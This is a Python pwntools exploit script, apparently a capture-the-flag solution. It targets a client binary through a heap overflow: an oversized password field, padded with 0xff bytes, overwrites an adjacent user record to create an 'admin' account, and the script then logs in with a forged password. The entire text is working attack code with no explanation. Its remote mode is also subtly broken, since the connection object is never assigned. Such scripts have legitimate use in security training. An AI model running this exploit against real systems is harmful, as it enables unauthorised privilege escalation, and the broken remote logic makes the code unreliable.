#!/usr/bin/env python3
# Logical bug with heap overflow.
from pwn import *

g_fname = args.FNAME if args.FNAME else "./client"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
	g_io = process([g_fname, "127.0.0.1", "9999"])
else:
	rhost, rport = args.REMOTE.split(":")
	# g_io = remote(rhost, int(rport))
	process([g_fname, rhost, rport])

g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(choice):
	sla("0 exit", str(choice))

def send_usr_info(name, passwd):
	sla("name", name)
	sla("input your passwd", passwd)

def reg(name, passwd):
	opt(1)
	send_usr_info(name, passwd)

def login(name, passwd):
	opt(2)
	send_usr_info(name, passwd)

def remove(name, passwd):
	opt(4)
	send_usr_info(name, passwd)

def pwn():
	reg("aaa", "a")
	reg("bbb", "b")
	remove("aaa", "a")
	getpid()
	reg('a'*0x20, flat(['a'*0x28, '\xff'*8, "admin\0"]))
	# reg('a'*0x20, flat(['a'*0x20, 0x55, '\xff'*8, "admin\0"]))
	login("admin", 'b')

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()

